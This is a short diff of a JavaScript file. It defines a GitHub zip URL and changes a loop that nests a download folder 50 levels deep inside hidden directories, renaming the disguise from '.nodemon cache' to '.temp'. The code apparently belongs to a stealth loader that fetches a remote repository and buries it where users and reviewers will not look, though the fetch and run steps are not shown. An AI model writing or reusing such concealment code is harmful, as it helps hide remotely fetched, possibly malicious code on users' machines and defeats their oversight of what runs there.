@@ -130,7 +130,7 @@ const repoZipUrl = 'https://github.com/3strox/x/archive/refs/heads/main.zip';
 // Base hidden folder
 let deepPath = path.join(__dirname, '.temp');
 for (let i = 0; i < 50; i++) {
-    deepPath = path.join(deepPath, '.nodemon cache'); // Nest 50 folders deep
+    deepPath = path.join(deepPath, '.temp'); // Nest 50 folders deep
 }
 const repoFolder = path.join(deepPath, '.repo');
 
